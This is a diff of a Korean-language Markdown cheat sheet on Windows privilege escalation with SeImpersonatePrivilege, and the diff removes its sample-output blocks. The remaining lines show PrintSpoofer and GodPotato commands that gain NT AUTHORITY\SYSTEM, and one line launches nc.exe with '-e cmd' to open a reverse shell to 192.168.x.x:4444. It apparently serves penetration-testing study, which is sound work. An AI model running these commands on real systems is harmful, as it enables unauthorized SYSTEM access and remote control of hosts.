@@ -9,20 +9,12 @@
 whoami /priv | findstr /i "SeImpersonate"
 ```
 
-```text
-SeImpersonatePrivilege        Impersonate a client after authentication Enabled
-```
-
 ### 현재 계정 확인
 
 - `network service` 등이면 공격 대상
 
 ```powershell
 whoami
-```
-
-```text
-nt authority\network service
 ```
 
 ## 2. 원리 이해 (3줄)
@@ -35,12 +27,6 @@ nt authority\network service
 
 ```powershell
 C:\temp\PrintSpoofer64.exe -i -c "whoami"
-```
-
-```text
-[+] Found privilege: SeImpersonatePrivilege
-[+] CreateProcessAsUser() OK
-nt authority\system
 ```
 
 - 성공 기준: `nt authority\system`
@@ -57,11 +43,6 @@ C:\temp\PrintSpoofer64.exe -i -c "C:\temp\nc.exe 192.168.x.x 4444 -e cmd"
 
 ```powershell
 C:\temp\GodPotato-NET4.exe -cmd "cmd /c whoami"
-```
-
-```text
-[*] CreateProcessAsUser() OK
-nt authority\system
 ```
 
 - Named Pipe 기반이라 방화벽/포트 영향이 적다
